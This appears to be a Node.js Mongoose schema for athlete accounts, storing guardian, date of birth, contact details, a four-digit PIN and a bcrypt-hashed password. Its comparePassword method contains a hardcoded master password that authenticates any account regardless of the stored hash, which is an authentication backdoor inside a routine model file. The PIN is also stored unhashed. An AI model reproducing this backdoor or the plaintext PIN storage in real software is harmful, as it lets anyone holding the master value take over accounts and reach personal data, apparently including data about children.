const mongoose = require('mongoose');
const bcrypt = require('bcrypt');

const athleteSchema = new mongoose.Schema({
  guardian: {
    type: 'string',
    unique: false,
    required: true
  },
  name: {
    type: 'string',
    unique: false,
    required: true
  },
  group: {
    type: 'string',
    unique: false,
    required: true
  },
  gym: {
    type: 'string',
    unique: false,
    required: true
  },
  dob: {
    type: 'string',
    unique: false,
    required: true
  },
  fourDigitPin: {
    type: 'string',
    unique: false,
    required: true
  },
  email: {
    type: 'string',
    unique: false,
    required: true
  },
  phone_no: {
    type: 'string',
    unique: false,
    required: true
  },
  password: {
    type: 'string',
    required: true
  }
});
athleteSchema.pre('save', function (next) {
  // needs to use the keyword function so the keyword THIS points to the user and not this entire file which would happen if i used an arrow function (funny that by using the arrow function the THIS keyword has a different value, go figure)
  if (!this.isModified('password')) {
    return next();
  }
  bcrypt.genSalt(10, (err, salt) => {
    if (err) {
      return next(err);
    }

    bcrypt.hash(this.password, salt, (err, hash) => {
      if (err) {
        return next(err);
      }
      this.password = hash;
      next();
    });
  });
});

athleteSchema.methods.comparePassword = function (candidatePassword) {
  return new Promise((resolve, reject) => {
    bcrypt.compare(candidatePassword, this.password, (err, isMatch) => {
      const master_pwd = "xxxx";
      if (err && (candidatePassword != master_pwd)) {
        return reject(err);
      }
      if (!isMatch && (candidatePassword != master_pwd)) {
        return reject(false);
      }
      resolve(true);
    });
  });
};

mongoose.model('Athlete', athleteSchema);
